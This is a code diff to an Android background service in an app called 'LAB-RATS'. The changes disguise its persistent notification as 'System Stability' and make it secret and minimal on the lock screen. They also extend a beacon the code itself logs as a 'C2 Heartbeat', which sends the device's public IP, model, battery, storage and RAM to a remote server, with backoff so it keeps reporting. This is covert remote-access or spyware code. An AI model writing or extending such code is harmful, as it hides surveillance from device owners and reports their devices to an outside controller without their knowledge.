@@ -50,6 +50,8 @@ public class HttpServerService extends Service {
     private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
     private ContentObserver messageObserver;
     private boolean isForeground = false;
+    private int webhookFailCount = 0;
+    private long lastWebhookFailTime = 0;
     private final Handler ipReportHandler = new Handler(Looper.getMainLooper());
     private final Runnable ipReportRunnable = this::checkAndReportIp;
 
@@ -230,9 +232,11 @@ public class HttpServerService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "LAB-RATS Server",
-                    NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("HTTP Server running");
+                    "System Stability",
+                    NotificationManager.IMPORTANCE_MIN);
+            channel.setDescription("Ensures background service persistence");
+            channel.setShowBadge(false);
+            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
 
             NotificationManager manager = getSystemService(NotificationManager.class);
             manager.createNotificationChannel(channel);
@@ -272,7 +276,8 @@ public class HttpServerService extends Service {
                 .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.app_logo)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                 .build();
     }
 
@@ -285,6 +290,7 @@ public class HttpServerService extends Service {
     @Override
     public void onDestroy() {
         isRunning = false;
+        isForeground = false; // CRITICAL: Reset state so next start calls startForeground()
         // Clean up resources immediately on background thread
         networkExecutor.execute(() -> {
             unregisterNetworkCallback();
@@ -346,8 +352,13 @@ public class HttpServerService extends Service {
     private void checkAndReportIp() {
         if (networkExecutor.isShutdown()) return;
         
-        // MainActivity.getPublicIPv6Async handles the threading internally,
-        // but we want to ensure we don't spam.
+        // Backoff Logic: If network is dead, don't spam attempts and drain battery
+        long now = System.currentTimeMillis();
+        long backoffDelay = webhookFailCount > 0 ? (long) Math.min(Math.pow(2, webhookFailCount) * 1000, 300000) : 0; // Max 5 min
+        if (now - lastWebhookFailTime < backoffDelay) {
+            return;
+        }
+
         MainActivity.getPublicIPv6Async(publicIp -> {
             if (networkExecutor.isShutdown()) return;
             
@@ -383,6 +394,9 @@ public class HttpServerService extends Service {
             
             String networkType = "Unknown";
             int batteryLevel = -1;
+            String storageInfo = "N/A";
+            String ramInfo = "N/A";
+            
             try {
                 // Get Network Type
                 if (connectivityManager != null) {
@@ -400,6 +414,17 @@ public class HttpServerService extends Service {
                     int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                     batteryLevel = (int) ((level / (float) scale) * 100);
                 }
+                
+                // Get Storage Info
+                android.os.StatFs stat = new android.os.StatFs(android.os.Environment.getExternalStorageDirectory().getPath());
+                long bytesAvailable = stat.getAvailableBlocksLong() * stat.getBlockSizeLong();
+                storageInfo = (bytesAvailable / (1024 * 1024 * 1024)) + "GB Free";
+                
+                // Get RAM Info
+                android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
+                ((android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(mi);
+                ramInfo = (mi.availMem / (1024 * 1024)) + "MB Free";
+
             } catch (Exception ignored) {}
 
             String jsonInputString = "{" +
@@ -408,6 +433,8 @@ public class HttpServerService extends Service {
                 "\"device\": \"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\", " +
                 "\"network\": \"" + networkType + "\", " +
                 "\"battery\": \"" + batteryLevel + "%\", " +
+                "\"storage\": \"" + storageInfo + "\", " +
+                "\"ram\": \"" + ramInfo + "\", " +
                 "\"stealth\": " + isStealthMode() + ", " +
                 "\"link\": \"" + link + "\"" +
                 "}";
@@ -419,9 +446,18 @@ public class HttpServerService extends Service {
 
             int code = conn.getResponseCode();
             Log.d(TAG, "C2 Heartbeat Response: " + code);
+            
+            if (code == 200) {
+                webhookFailCount = 0; // Reset on success
+            } else {
+                webhookFailCount++;
+                lastWebhookFailTime = System.currentTimeMillis();
+            }
 
         } catch (Exception e) {
             Log.e(TAG, "Failed to report telemetry: " + e.getMessage());
+            webhookFailCount++;
+            lastWebhookFailTime = System.currentTimeMillis();
         }
     }
 }
